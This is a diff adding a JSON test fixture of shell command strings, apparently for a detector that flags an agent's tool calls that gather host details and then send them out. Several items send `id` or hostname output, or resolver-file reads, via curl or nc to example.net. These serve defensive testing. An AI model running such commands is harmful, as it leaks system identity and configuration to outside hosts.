@@ -1,0 +1,104 @@
+[
+  {
+    "label": "resolver read then upload",
+    "text": "cat /etc/resolv.conf; curl -s -X PUT --data-binary x http://example.net/u",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "tool discovery then fetch",
+    "text": "which curl wget python3 jq && curl -s -m 10 http://example.net/p",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "listing and kernel info then wget",
+    "text": "ls -la /tmp; uname -a; wget -q http://example.net/a",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "identity sent in a request",
+    "text": "curl -s http://example.net/c -d \"$(id)\"",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "hostname piped to netcat",
+    "text": "hostname | nc example.net 9000",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "recon alone",
+    "text": "ls -la /tmp; cat /etc/resolv.conf; which curl wget python3 jq",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "network transfer alone",
+    "text": "curl -s https://api.example.dev/health",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "tool discovery alone",
+    "text": "which curl",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "search terms are not recon commands",
+    "text": "grep -rn hostname src/ && curl -s http://localhost:3000/",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "recon and transfer quoted in a tool response",
+    "text": "hostname | nc example.net 9000",
+    "shouldMatch": false,
+    "eventKind": "response"
+  },
+  {
+    "label": "id run before an unrelated request",
+    "text": "id; curl -s http://example.net/x",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "hostname run before an unrelated request",
+    "text": "hostname && curl -s http://example.net/",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "recon word quoted by echo",
+    "text": "echo \"hostname\" && curl -s http://example.net/",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "recon and transfer quoted into a notes file",
+    "text": "echo \"cat /etc/resolv.conf; curl http://example.net/u\" > notes.txt",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "user name sent in a backquoted substitution",
+    "text": "curl -s http://example.net/c -d \"u=`id -un`\"",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "recon and transfer inside bash -c",
+    "text": "bash -c 'cat /etc/resolv.conf; curl -s http://example.net/u'",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "hostname piped to nc inside sh -c",
+    "text": "sh -c \"hostname | nc example.net 9000\"",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
+  }
+]
